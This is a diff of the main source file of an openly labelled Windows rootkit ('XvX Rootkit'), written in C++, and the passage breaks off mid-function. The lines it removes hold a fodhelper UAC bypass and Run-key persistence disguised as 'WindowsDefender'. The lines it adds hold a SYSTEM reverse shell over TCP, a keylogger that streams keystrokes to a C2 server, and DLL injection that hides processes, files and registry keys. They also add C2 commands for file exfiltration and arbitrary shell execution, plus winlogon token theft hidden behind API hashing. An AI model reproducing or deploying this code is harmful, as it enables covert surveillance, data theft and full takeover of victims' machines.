@@ -1,38 +1,47 @@
-/*
- * XvX Rootkit - Main Component
- * Copyright (c) 2025 - 28zaakypro@proton.me
- *
- * NT AUTHORITY\SYSTEM privilege escalation rootkit with C2 capabilities.
- * Features: UAC bypass, token stealing, process/file/registry hiding,
- * interactive SYSTEM shell, DLL injection, WMI monitoring.
- */
-
+#include <winsock2.h>
+#include <ws2tcpip.h>
 #include <windows.h>
 #include <iostream>
 #include <vector>
 #include <string>
 #include <cstdio>
 #include <fstream>
-#include "../include/IPCObjects_File.h"
-#include "../include/multiDLLInjector.h"
-#include "../include/AntiAnalysis.h"
+#include <sstream>
+#include <algorithm>
+#include <tlhelp32.h>
+#include "../include/Evasion.h"
+#include "../include/IndirectSyscalls.h"
 #include "../include/C2Client.h"
 #include "../include/Keylogger.h"
+#include "../include/Unhooking.h"
+#include "../include/ETWAMSIBypass.h"
+#include "../include/NamedPipePrivEsc.h"
+#include "../include/Persistence.h"
+#include "../include/DLLInjector.h"
+#include "../include/IPCObjects_File.h"
+#include "../include/Evasion.h"
+#include "../include/DebugLog.h"
+#include "../include/StringObfuscation.h"
+#include "../include/HandleWrapper.h"
+#include "../include/JitterSleep.h"
+
+#pragma comment(lib, "ws2_32.lib")
 
 using namespace std;
 
-// Production mode: disable all console output
 #ifndef _DEBUG
 #define SILENT_MODE 1
 #else
 #define SILENT_MODE 0
 #endif
 
-vector<wstring> agentVector;    // Processes to hide
-vector<wstring> pathVector;     // Files/folders to hide
-vector<wstring> registryVector; // Registry keys to hide
+HANDLE g_systemToken = NULL;
+C2Client *g_c2Client = nullptr;
 
-HANDLE g_systemToken = NULL; // Global SYSTEM token
+// Hiding vectors (synchronized with DLLs via memorymapped files)
+vector<wstring> agentVector;    // Hidden processes
+vector<wstring> pathVector;     // Hidden files/directories
+vector<wstring> registryVector; // Hidden registry keys
 
 struct InteractiveShell
 {
@@ -54,22 +63,14 @@ bool StartInteractiveShell()
 {
     if (g_shell.active)
         return true;
-
-    // Ensure critical section is initialized
-    if (g_shell.cs.DebugInfo == NULL) {
+    if (g_shell.cs.DebugInfo == NULL)
         InitShell();
-    }
 
     SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
     HANDLE hOutputWrite = NULL, hInputRead = NULL;
 
-    // Create pipe for stdout
     if (!CreatePipe(&g_shell.hOutputRead, &hOutputWrite, &sa, 0))
-    {
         return false;
-    }
-
-    // Create pipe for stdin
     if (!CreatePipe(&hInputRead, &g_shell.hInputWrite, &sa, 0))
     {
         CloseHandle(g_shell.hOutputRead);
@@ -77,11 +78,9 @@ bool StartInteractiveShell()
         return false;
     }
 
-    // Handles that must NOT be inherited by child process
     SetHandleInformation(g_shell.hOutputRead, HANDLE_FLAG_INHERIT, 0);
     SetHandleInformation(g_shell.hInputWrite, HANDLE_FLAG_INHERIT, 0);
 
-    // Configure STARTUPINFO for pipe redirection
     STARTUPINFOW si;
     PROCESS_INFORMATION pi;
     ZeroMemory(&si, sizeof(si));
@@ -93,47 +92,24 @@ bool StartInteractiveShell()
     si.hStdOutput = hOutputWrite;
     si.hStdError = hOutputWrite;
 
-    // Launch cmd.exe with UTF-8 and English locale
-    wchar_t cmdLine[] = L"cmd.exe /K chcp 65001 >nul && set LANG=en_US.UTF-8";
+    wstring cmdLine = wstring(L"cmd.exe") + L" /K chcp 65001 >nul && set LANG=en_US.UTF-8";
     BOOL success = FALSE;
 
     if (g_systemToken != NULL)
     {
-        // Method: CreateProcessWithTokenW (more reliable)
-        success = CreateProcessWithTokenW(
-            g_systemToken,
-            0,
-            NULL,
-            cmdLine,
-            CREATE_NO_WINDOW,
-            NULL,
-            NULL,
-            &si,
-            &pi);
-
-        // Method: Fallback to CreateProcessAsUserW if Method 1 fails
+        success = CreateProcessWithTokenW(g_systemToken, 0, NULL, (LPWSTR)cmdLine.c_str(),
+                                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
         if (!success)
         {
-            success = CreateProcessAsUserW(
-                g_systemToken,
-                NULL,
-                cmdLine,
-                NULL,
-                NULL,
-                TRUE,
-                CREATE_NO_WINDOW,
-                NULL,
-                NULL,
-                &si,
-                &pi);
+            success = CreateProcessAsUserW(g_systemToken, NULL, (LPWSTR)cmdLine.c_str(),
+                                           NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
         }
     }
 
-    // Fallback: Use normal CreateProcessW if no SYSTEM token
     if (!success)
     {
-        success = CreateProcessW(NULL, cmdLine, NULL, NULL, TRUE,
-                                 CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+        success = CreateProcessW(NULL, (LPWSTR)cmdLine.c_str(), NULL, NULL, TRUE,
+                                 CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP, NULL, NULL, &si, &pi);
     }
 
     if (!success)
@@ -145,10 +121,8 @@ bool StartInteractiveShell()
         return false;
     }
 
-    // Close handles inherited by child (keep only our copies)
     CloseHandle(hOutputWrite);
     CloseHandle(hInputRead);
-
     g_shell.hProcess = pi.hProcess;
     g_shell.hThread = pi.hThread;
     g_shell.active = true;
@@ -157,18 +131,16 @@ bool StartInteractiveShell()
     return true;
 }
 
+// Read output from shell process via named pipe
 wstring ReadShellOutput()
 {
     if (!g_shell.active)
         return L"";
 
     EnterCriticalSection(&g_shell.cs);
-
     char buffer[4096];
     DWORD bytesRead;
     wstring output;
-
-    // Get console output codepage for proper encoding
     UINT codepage = GetConsoleOutputCP();
     if (codepage == 0)
         codepage = CP_OEMCP;
@@ -178,7 +150,6 @@ wstring ReadShellOutput()
         if (ReadFile(g_shell.hOutputRead, buffer, min(sizeof(buffer) - 1, (size_t)bytesRead), &bytesRead, NULL))
         {
             buffer[bytesRead] = '\0';
-            // Use console codepage for proper encoding (handles accents)
             int wlen = MultiByteToWideChar(codepage, 0, buffer, bytesRead, NULL, 0);
             if (wlen > 0)
             {
@@ -190,202 +161,158 @@ wstring ReadShellOutput()
             }
         }
         else
-        {
             break;
-        }
     }
 
     g_shell.outputBuffer += output;
     wstring result = g_shell.outputBuffer;
     g_shell.outputBuffer.clear();
-
     LeaveCriticalSection(&g_shell.cs);
     return result;
 }
 
+// Write command input to shell process stdin
 void WriteShellInput(const wstring &cmd)
 {
     if (!g_shell.active)
         return;
 
     EnterCriticalSection(&g_shell.cs);
-
     string cmdA(cmd.begin(), cmd.end());
     cmdA += "\r\n";
     DWORD bytesWritten;
     WriteFile(g_shell.hInputWrite, cmdA.c_str(), (DWORD)cmdA.size(), &bytesWritten, NULL);
-
     LeaveCriticalSection(&g_shell.cs);
 }
 
-bool UACBypass()
+bool StartSystemReverseShell(const char *host, int port);
+
+struct ReverseShellParams
 {
-    // Check if already admin
-    BOOL isAdmin = FALSE;
-    PSID adminGroup = NULL;
-    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
+    char host[256];
+    int port;
+};
 
-    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
-                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &adminGroup))
+DWORD WINAPI ReverseShellThread(LPVOID param)
+{
+    ReverseShellParams *params = (ReverseShellParams *)param;
+    StartSystemReverseShell(params->host, params->port);
+    delete params;
+    return 0;
+}
+
+// Create TCP reverse shell with SYSTEM privileges
+bool StartSystemReverseShell(const char *host, int port)
+{
+    WSADATA wsaData;
+    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+        return false;
+
+    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock == INVALID_SOCKET)
     {
-        CheckTokenMembership(NULL, adminGroup, &isAdmin);
-        FreeSid(adminGroup);
-    }
-
-    if (isAdmin)
-    {
-        return true;
-    }
-
-    // Get full path of our EXE
-    WCHAR exePath[MAX_PATH];
-    GetModuleFileNameW(NULL, exePath, MAX_PATH);
-
-    // Create registry hijack key
-    HKEY hKey;
-    LONG result = RegCreateKeyExW(
-        HKEY_CURRENT_USER,
-        L"Software\\Classes\\ms-settings\\shell\\open\\command",
-        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
-
-    if (result != ERROR_SUCCESS)
-    {
+        WSACleanup();
         return false;
     }
 
-    // Set default value (our EXE)
-    RegSetValueExW(hKey, L"", 0, REG_SZ, (BYTE *)exePath,
-                   (wcslen(exePath) + 1) * sizeof(WCHAR));
+    sockaddr_in addr;
+    addr.sin_family = AF_INET;
+    addr.sin_port = htons(port);
+    inet_pton(AF_INET, host, &addr.sin_addr);
 
-    // Set empty DelegateExecute
-    RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (BYTE *)L"", sizeof(WCHAR));
-
-    RegCloseKey(hKey);
-
-    // Launch fodhelper.exe to execute payload as admin
-    SHELLEXECUTEINFOW sei = {sizeof(sei)};
-    sei.lpVerb = L"open";
-    sei.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
-    sei.nShow = SW_HIDE;
-
-    if (ShellExecuteExW(&sei))
+    if (connect(sock, (sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR)
     {
-        // Wait for new process to start
-        Sleep(2000);
-
-        // Clean up registry keys
-        RegDeleteTreeW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
-
-        // Terminate this process (new admin takes over)
-        ExitProcess(0);
+        closesocket(sock);
+        WSACleanup();
+        return false;
     }
 
-    return false;
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    ZeroMemory(&pi, sizeof(pi));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    si.hStdInput = (HANDLE)sock;
+    si.hStdOutput = (HANDLE)sock;
+    si.hStdError = (HANDLE)sock;
+
+    char cmdLine[] = "cmd.exe";
+    BOOL success = FALSE;
+
+    // Try to create process with SYSTEM token if available
+    if (g_systemToken != NULL && g_systemToken != INVALID_HANDLE_VALUE)
+    {
+        success = CreateProcessWithTokenW(g_systemToken, 0, NULL,
+                                          (LPWSTR)L"cmd.exe",
+                                          CREATE_NO_WINDOW, NULL, NULL,
+                                          (LPSTARTUPINFOW)&si, &pi);
+        if (!success)
+        {
+            success = CreateProcessAsUserW(g_systemToken, NULL,
+                                           (LPWSTR)L"cmd.exe",
+                                           NULL, NULL, TRUE,
+                                           CREATE_NO_WINDOW, NULL, NULL,
+                                           (LPSTARTUPINFOW)&si, &pi);
+        }
+    }
+
+    if (!success)
+    {
+        success = CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE,
+                                 CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    }
+
+    if (!success)
+    {
+        closesocket(sock);
+        WSACleanup();
+        return false;
+    }
+
+    CloseHandle(pi.hThread);
+    WaitForSingleObject(pi.hProcess, INFINITE);
+    CloseHandle(pi.hProcess);
+    closesocket(sock);
+    WSACleanup();
+
+    return true;
 }
 
-void addPersistence()
+// Keylogger callback
+void OnKeylogData(const wstring &keylog)
 {
-    // 1. Get full path of current EXE
-    WCHAR exePath[MAX_PATH];
-    GetModuleFileNameW(NULL, exePath, MAX_PATH);
+    LOG_INFO(wstring(L"Keylog callback - Size: ") + to_wstring(keylog.size()) + L" chars");
 
-    // 2. Open Registry Run key
-    HKEY hKey;
-    LONG result = RegOpenKeyExW(
-        HKEY_CURRENT_USER,
-        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-        0,
-        KEY_WRITE,
-        &hKey);
-
-    if (result != ERROR_SUCCESS)
+    if (g_c2Client == nullptr)
     {
-        wcout << L"[!] Failed to open registry key" << endl;
+        LOG_ERROR(L"g_c2Client is NULL!");
         return;
     }
 
-    // 3. Add value
-    result = RegSetValueExW(
-        hKey,
-        L"WindowsDefender",
-        0,
-        REG_SZ,
-        (BYTE *)exePath,
-        (wcslen(exePath) + 1) * sizeof(WCHAR));
-
-    RegCloseKey(hKey);
-
-    #ifdef _DEBUG
-    if (result == ERROR_SUCCESS)
+    if (keylog.empty())
     {
-        wcout << L"[+] Persistence installed (Registry Run Key)" << endl;
+        LOG_WARN(L"Empty keylog buffer, skipping");
+        return;
     }
-    else
-    {
-        wcout << L"[!] Failed to install persistence" << endl;
-    }
-    #endif
+
+    // Generate unique ID with timestamp
+    wstring commandID = L"keylog_" + to_wstring(GetTickCount64());
+
+    // Send to C2 immediately
+    g_c2Client->sendResult(commandID, L"success", keylog);
+
+    LOG_SUCCESS(wstring(L"Sent to C2: ") + to_wstring(keylog.size()) + L" chars");
 }
 
-// Global C2 pointer for keylogger callback
-C2Client* g_c2Client = nullptr;
-
-// Callback function for keylogger
-void OnKeylogData(const wstring& keylog)
+// Handle hide/unhide commands for processes, files, and registry
+void processHidingCommand(const wstring &type, const wstring &action, const wstring &value = L"")
 {
-    if (g_c2Client != nullptr)
-    {
-        // Generate unique command ID for keylog
-        wstring commandID = L"keylog_" + to_wstring(GetTickCount64());
-        
-        // Send keylog to C2 server (commandID, status, output)
-        g_c2Client->sendResult(commandID, L"success", keylog);
-        wcout << L"[+] Keylog data sent to C2 (" << keylog.size() << L" chars)" << endl;
-    }
-}
-
-void showHelp()
-{
-    wcout << L"\n========================================" << endl;
-    wcout << L"  XvX UserMode Rootkit - Help" << endl;
-    wcout << L"========================================\n"
-          << endl;
-
-    wcout << L"COMMANDS:\n"
-          << endl;
-    wcout << L"  Process Hiding:" << endl;
-    wcout << L"    rootkit.exe process hide <processname.exe>" << endl;
-    wcout << L"    rootkit.exe process show\n"
-          << endl;
-
-    wcout << L"  File/Directory Hiding:" << endl;
-    wcout << L"    rootkit.exe path hide <C:\\path\\to\\folder>" << endl;
-    wcout << L"    rootkit.exe path show\n"
-          << endl;
-
-    wcout << L"  Registry Hiding:" << endl;
-    wcout << L"    rootkit.exe registry hide <KeyName>" << endl;
-    wcout << L"    rootkit.exe registry show\n"
-          << endl;
-
-    wcout << L"EXAMPLES:\n"
-          << endl;
-    wcout << L"  rootkit.exe process hide malware.exe" << endl;
-    wcout << L"  rootkit.exe path hide C:\\Users\\Public\\Music" << endl;
-    wcout << L"  rootkit.exe registry hide MyHiddenKey" << endl;
-
-    wcout << L"\n========================================\n"
-          << endl;
-}
-
-void processCommand(const wstring &type, const wstring &action, const wstring &value = L"")
-{
-
     if (type == L"process")
     {
         if (action == L"hide" && !value.empty())
         {
-            // Add process to hide
             try
             {
                 agentVector = deserializeWStringVector(L"agentMapped");
@@ -394,49 +321,48 @@ void processCommand(const wstring &type, const wstring &action, const wstring &v
             {
                 agentVector.clear();
             }
-
             agentVector.push_back(value);
             Serialitzator::serializeVectorWString(agentVector, L"agentMapped");
-
+#ifdef _DEBUG
             wcout << L"[+] Process added to hide list: " << value << endl;
+#endif
 
-            // Inject Hooks.dll if active
-            int taskmgrPID = getPIDbyProcName("taskmgr.exe");
-            if (taskmgrPID != 0)
+            DWORD taskmgrPID = getPIDbyProcName("taskmgr.exe");
+            if (taskmgrPID != 0 && !isDLLLoaded(taskmgrPID, OBFUSCATE_W(L"processHooks.dll")))
             {
-                char dllPath[MAX_PATH];
-                GetModuleFileNameA(NULL, dllPath, MAX_PATH);
-                // Replace rootkit.exe with processHooks\\processHooks.dll
-                string pathStr(dllPath);
-                size_t pos = pathStr.find_last_of("\\");
-                if (pos != string::npos) {
-                    pathStr = pathStr.substr(0, pos) + "\\processHooks\\processHooks.dll";
-                }
-
-                if (injectDLL(pathStr, taskmgrPID))
+                wchar_t dllPath[MAX_PATH];
+                GetModuleFileNameW(NULL, dllPath, MAX_PATH);
+                wstring pathW(dllPath);
+                size_t pos = pathW.find_last_of(L"\\");
+                if (pos != wstring::npos)
                 {
-                    wcout << L"[+] processHooks.dll injected into taskmgr.exe" << endl;
+                    pathW = pathW.substr(0, pos) + OBFUSCATE_W(L"\\processHooks.dll");
+                    if (injectDLL(pathW.c_str(), taskmgrPID))
+                    {
+#ifdef _DEBUG
+                        wcout << L"[+] processHooks.dll injected into taskmgr.exe" << endl;
+#endif
+                    }
                 }
             }
         }
-        else if (action == L"show")
+        else if (action == L"unhide" && !value.empty())
         {
             try
             {
                 agentVector = deserializeWStringVector(L"agentMapped");
-                wcout << L"\n[*] Hidden processes (" << agentVector.size() << L"):" << endl;
-                for (const auto &proc : agentVector)
-                {
-                    wcout << L"  - " << proc << endl;
-                }
+                agentVector.erase(remove(agentVector.begin(), agentVector.end(), value), agentVector.end());
+                Serialitzator::serializeVectorWString(agentVector, L"agentMapped");
+#ifdef _DEBUG
+                wcout << L"[+] Process removed from hide list: " << value << endl;
+#endif
             }
             catch (...)
             {
-                wcout << L"[i] No hidden processes" << endl;
             }
         }
     }
-    else if (type == L"path")
+    else if (type == L"file")
     {
         if (action == L"hide" && !value.empty())
         {
@@ -452,40 +378,42 @@ void processCommand(const wstring &type, const wstring &action, const wstring &v
             pathVector.push_back(value);
             Serialitzator::serializeVectorWString(pathVector, L"pathMapped");
 
+#ifdef _DEBUG
             wcout << L"[+] Path added to hide list: " << value << endl;
+#endif
 
-            // Inject Hooks.dll if active
-            int explorerPID = getPIDbyProcName("explorer.exe");
-            if (explorerPID != 0)
+            DWORD explorerPID = getPIDbyProcName("explorer.exe");
+            if (explorerPID != 0 && !isDLLLoaded(explorerPID, OBFUSCATE_W(L"fileHooks.dll")))
             {
-                char dllPath[MAX_PATH];
-                GetModuleFileNameA(NULL, dllPath, MAX_PATH);
-                string pathStr(dllPath);
-                size_t pos = pathStr.find_last_of("\\");
-                if (pos != string::npos) {
-                    pathStr = pathStr.substr(0, pos) + "\\fileHooks\\fileHooks.dll";
-                }
-
-                if (injectDLL(pathStr, explorerPID))
+                wchar_t dllPath[MAX_PATH];
+                GetModuleFileNameW(NULL, dllPath, MAX_PATH);
+                wstring pathW(dllPath);
+                size_t pos = pathW.find_last_of(L"\\");
+                if (pos != wstring::npos)
                 {
-                    wcout << L"[+] fileHooks.dll injected into explorer.exe" << endl;
+                    pathW = pathW.substr(0, pos) + OBFUSCATE_W(L"\\fileHooks.dll");
+                    if (injectDLL(pathW.c_str(), explorerPID))
+                    {
+#ifdef _DEBUG
+                        wcout << L"[+] fileHooks.dll injected into explorer.exe" << endl;
+#endif
+                    }
                 }
             }
         }
-        else if (action == L"show")
+        else if (action == L"unhide" && !value.empty())
         {
             try
             {
                 pathVector = deserializeWStringVector(L"pathMapped");
-                wcout << L"\n[*] Hidden paths (" << pathVector.size() << L"):" << endl;
-                for (const auto &path : pathVector)
-                {
-                    wcout << L"  - " << path << endl;
-                }
+                pathVector.erase(remove(pathVector.begin(), pathVector.end(), value), pathVector.end());
+                Serialitzator::serializeVectorWString(pathVector, L"pathMapped");
+#ifdef _DEBUG
+                wcout << L"[+] Path removed from hide list: " << value << endl;
+#endif
             }
             catch (...)
             {
-                wcout << L"[i] No hidden paths" << endl;
             }
         }
     }
@@ -505,109 +433,118 @@ void processCommand(const wstring &type, const wstring &action, const wstring &v
             registryVector.push_back(value);
             Serialitzator::serializeVectorWString(registryVector, L"registryMapped");
 
+#ifdef _DEBUG
             wcout << L"[+] Registry key added to hide list: " << value << endl;
+#endif
 
-            // Inject Hooks.dll if active
-            int regeditPID = getPIDbyProcName("regedit.exe");
-            if (regeditPID != 0)
+            DWORD regeditPID = getPIDbyProcName("regedit.exe");
+            if (regeditPID != 0 && !isDLLLoaded(regeditPID, OBFUSCATE_W(L"registryHooks.dll")))
             {
-                char dllPath[MAX_PATH];
-                GetModuleFileNameA(NULL, dllPath, MAX_PATH);
-                string pathStr(dllPath);
-                size_t pos = pathStr.find_last_of("\\");
-                if (pos != string::npos) {
-                    pathStr = pathStr.substr(0, pos) + "\\registryHooks\\registryHooks.dll";
-                }
-
-                if (injectDLL(pathStr, regeditPID))
+                wchar_t dllPath[MAX_PATH];
+                GetModuleFileNameW(NULL, dllPath, MAX_PATH);
+                wstring pathW(dllPath);
+                size_t pos = pathW.find_last_of(L"\\");
+                if (pos != wstring::npos)
                 {
-                    wcout << L"[+] registryHooks.dll injected into regedit.exe" << endl;
+                    pathW = pathW.substr(0, pos) + OBFUSCATE_W(L"\\registryHooks.dll");
+                    if (injectDLL(pathW.c_str(), regeditPID))
+                    {
+#ifdef _DEBUG
+                        wcout << L"[+] registryHooks.dll injected into regedit.exe" << endl;
+#endif
+                    }
                 }
             }
         }
-        else if (action == L"show")
+        else if (action == L"unhide" && !value.empty())
         {
             try
             {
                 registryVector = deserializeWStringVector(L"registryMapped");
-                wcout << L"\n[*] Hidden registry keys (" << registryVector.size() << L"):" << endl;
-                for (const auto &key : registryVector)
-                {
-                    wcout << L"  - " << key << endl;
-                }
+                registryVector.erase(remove(registryVector.begin(), registryVector.end(), value), registryVector.end());
+                Serialitzator::serializeVectorWString(registryVector, L"registryMapped");
+#ifdef _DEBUG
+                wcout << L"[+] Registry key removed from hide list: " << value << endl;
+#endif
             }
             catch (...)
             {
-                wcout << L"[i] No hidden registry keys" << endl;
             }
         }
     }
 }
 
+// C2 communication thread - beacon loop and command dispatcher
 DWORD WINAPI c2ModeThread(LPVOID lpParam)
 {
     C2Client *c2 = (C2Client *)lpParam;
     c2->setActive(true);
-    
-    #ifdef _DEBUG
-    wcout << L"[C2] Thread started, sending initial beacon..." << endl;
-    #endif
 
+#ifdef _DEBUG
+    wcout << L"[C2] Thread started" << endl;
+#ifdef _DEBUG
+    wcout << L"[C2] Beacon interval: 30 seconds (default)" << endl;
+#endif
+#ifdef _DEBUG
+    wcout << L"[C2] Starting beacon loop..." << endl;
+#endif
+#endif
+
+    int beaconCount = 0;
     while (c2->isRunning())
     {
         try
         {
-            // Beacon to C2 (immediately on first loop, then after sleep)
-            vector<wstring> commands = c2->checkIn();
-            #ifdef _DEBUG
-            wcout << L"[C2] Beacon sent, received " << commands.size() << L" command(s)" << endl;
-            #endif
+            beaconCount++;
+#ifdef _DEBUG
+            wcout << L"\n[C2] ========== Beacon #" << beaconCount << L" ==========" << endl;
+#ifdef _DEBUG
+            wcout << L"[C2] Calling checkIn()..." << endl;
+#endif
+#endif
 
-            // Process each command
+            vector<wstring> commands = c2->checkIn();
+
+#ifdef _DEBUG
+            wcout << L"[C2] checkIn() returned " << commands.size() << L" commands" << endl;
+#endif
+
             for (const wstring &cmdLine : commands)
             {
-                // Parser: CMD|ARG1|ARG2 (optional args)
                 size_t pos = cmdLine.find(L'|');
-                wstring cmd, args;
-
-                if (pos == wstring::npos)
-                {
-                    // Command without arguments
-                    cmd = cmdLine;
-                    args = L"";
-                }
-                else
-                {
-                    cmd = cmdLine.substr(0, pos);
-                    args = cmdLine.substr(pos + 1);
-                }
-
+                wstring cmd = (pos == wstring::npos) ? cmdLine : cmdLine.substr(0, pos);
+                wstring args = (pos == wstring::npos) ? L"" : cmdLine.substr(pos + 1);
                 wstring result;
 
-                // Hide commands
                 if (cmd == L"hide_process")
                 {
-                    processCommand(L"process", L"hide", args);
-                    result = L"Process hidden: " + args;
+                    processHidingCommand(L"process", L"hide", args);
+                    result = L"SUCCESS|Process hidden: " + args;
                 }
                 else if (cmd == L"hide_file")
                 {
-                    processCommand(L"path", L"hide", args);
-                    result = L"File hidden: " + args;
+                    processHidingCommand(L"file", L"hide", args);
+                    result = L"SUCCESS|File/folder hidden: " + args;
                 }
                 else if (cmd == L"hide_registry")
                 {
-                    processCommand(L"registry", L"hide", args);
-                    result = L"Registry key hidden: " + args;
+                    processHidingCommand(L"registry", L"hide", args);
+                    result = L"SUCCESS|Registry key hidden: " + args;
                 }
-                // Unhide commands
                 else if (cmd == L"unhide_process")
                 {
-                    // Remove from agentVector
-                    auto &vec = agentVector;
-                    vec.erase(remove(vec.begin(), vec.end(), args), vec.end());
-                    Serialitzator::serializeVectorWString(vec, L"agentMapped");
-                    result = L"Process unhidden: " + args;
+                    processHidingCommand(L"process", L"unhide", args);
+                    result = L"SUCCESS|Process unhidden: " + args;
+                }
+                else if (cmd == L"unhide_file")
+                {
+                    processHidingCommand(L"file", L"unhide", args);
+                    result = L"SUCCESS|File unhidden: " + args;
+                }
+                else if (cmd == L"unhide_registry")
+                {
+                    processHidingCommand(L"registry", L"unhide", args);
+                    result = L"SUCCESS|Registry key unhidden: " + args;
                 }
                 else if (cmd == L"unhide_all")
                 {
@@ -617,12 +554,12 @@ DWORD WINAPI c2ModeThread(LPVOID lpParam)
                     Serialitzator::serializeVectorWString(agentVector, L"agentMapped");
                     Serialitzator::serializeVectorWString(pathVector, L"pathMapped");
                     Serialitzator::serializeVectorWString(registryVector, L"registryMapped");
-                    result = L"All items unhidden";
+                    result = L"SUCCESS|All items unhidden";
                 }
-                // File exfiltration
+
+                // File operations
                 else if (cmd == L"exfil")
                 {
-                    // Convert wstring to string for ifstream
                     string filePathA(args.begin(), args.end());
                     ifstream file(filePathA, ios::binary);
                     if (file)
@@ -638,18 +575,16 @@ DWORD WINAPI c2ModeThread(LPVOID lpParam)
                         result = L"ERROR|File not found: " + args;
                     }
                 }
-                // Shell command execution
                 else if (cmd == L"shell")
                 {
                     wchar_t buffer[4096];
-                    FILE *pipe = _wpopen((L"cmd.exe /c " + args).c_str(), L"r");
+                    wstring cmdExec = wstring(L"cmd.exe") + L" /c " + args;
+                    FILE *pipe = _wpopen(cmdExec.c_str(), L"r");
                     if (pipe)
                     {
                         wstring output;
                         while (fgetws(buffer, 4096, pipe))
-                        {
                             output += buffer;
-                        }
                         _pclose(pipe);
                         result = L"SHELL|" + output;
                     }
@@ -658,131 +593,222 @@ DWORD WINAPI c2ModeThread(LPVOID lpParam)
                         result = L"ERROR|Failed to execute command";
                     }
                 }
-
-                // Change beacon interval
                 else if (cmd == L"sleep")
                 {
                     DWORD seconds = (DWORD)_wtoi(args.c_str());
                     c2->setBeaconInterval(seconds);
                     result = L"Beacon interval set to " + args + L" seconds";
                 }
-                // Privilege Escalation vers SYSTEM
                 else if (cmd == L"privesc")
                 {
-                    // Token Stealing from winlogon.exe to obtain SYSTEM
-                    HANDLE hToken = NULL;
-                    HANDLE hNewToken = NULL;
-                    DWORD winlogonPID = 0;
-
-                    // Find winlogon.exe
-                    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-                    if (hSnapshot != INVALID_HANDLE_VALUE)
+                    // Try Named Pipe escalation first
+                    if (NamedPipePrivEsc::EscalatePrivileges())
                     {
-                        PROCESSENTRY32W pe = {sizeof(pe)};
-                        if (Process32FirstW(hSnapshot, &pe))
-                        {
-                            do
-                            {
-                                if (wcscmp(pe.szExeFile, L"winlogon.exe") == 0)
-                                {
-                                    winlogonPID = pe.th32ProcessID;
-                                    break;
-                                }
-                            } while (Process32NextW(hSnapshot, &pe));
-                        }
-                        CloseHandle(hSnapshot);
-                    }
-
-                    if (winlogonPID == 0)
-                    {
-                        result = L"ERROR|winlogon.exe not found";
+                        result = L"SUCCESS|Escalated to SYSTEM via Named Pipe";
                     }
                     else
                     {
+                        // Fallback
+                        result = L"INFO|Named Pipe failed, trying token stealing...";
+
                         // Enable SeDebugPrivilege
+                        typedef BOOL(WINAPI * pOpenProcessToken)(HANDLE, DWORD, PHANDLE);
+                        typedef BOOL(WINAPI * pLookupPrivilegeValueW)(LPCWSTR, LPCWSTR, PLUID);
+                        typedef BOOL(WINAPI * pAdjustTokenPrivileges)(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
+
+                        auto fnOpenToken = (pOpenProcessToken)APIResolver::ResolveAPI(APIHash::OpenProcessToken);
+                        auto fnLookup = (pLookupPrivilegeValueW)APIResolver::ResolveAPI(APIHash::LookupPrivilegeValueW);
+                        auto fnAdjust = (pAdjustTokenPrivileges)APIResolver::ResolveAPI(APIHash::AdjustTokenPrivileges);
+
                         HANDLE hCurrentToken;
-                        if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hCurrentToken))
+                        if (fnOpenToken && fnOpenToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hCurrentToken))
                         {
                             TOKEN_PRIVILEGES tp;
                             LUID luid;
-                            if (LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid))
+                            if (fnLookup && fnLookup(NULL, L"SeDebugPrivilege", &luid))
                             {
                                 tp.PrivilegeCount = 1;
                                 tp.Privileges[0].Luid = luid;
                                 tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-                                AdjustTokenPrivileges(hCurrentToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+                                if (fnAdjust)
+                                    fnAdjust(hCurrentToken, FALSE, &tp, sizeof(tp), NULL, NULL);
                             }
                             CloseHandle(hCurrentToken);
                         }
 
-                        // Open winlogon.exe
-                        HANDLE hWinlogon = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, winlogonPID);
-                        if (hWinlogon)
-                        {
-                            // Steal SYSTEM token
-                            if (OpenProcessToken(hWinlogon, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken))
-                            {
-                                if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hNewToken))
-                                {
-                                    // Store the token for CreateProcessAsUser
-                                    if (g_systemToken != NULL && g_systemToken != INVALID_HANDLE_VALUE)
-                                        CloseHandle(g_systemToken);
-                                    g_systemToken = hNewToken;
+                        // Find winlogon.exe PID
+                        DWORD winlogonPID = 0;
+                        typedef HANDLE(WINAPI * pCreateToolhelp32Snapshot)(DWORD, DWORD);
+                        auto fnSnapshot = (pCreateToolhelp32Snapshot)APIResolver::ResolveAPI(APIHash::CreateToolhelp32Snapshot);
 
-                                    // Impersonate SYSTEM
-                                    if (ImpersonateLoggedOnUser(g_systemToken))
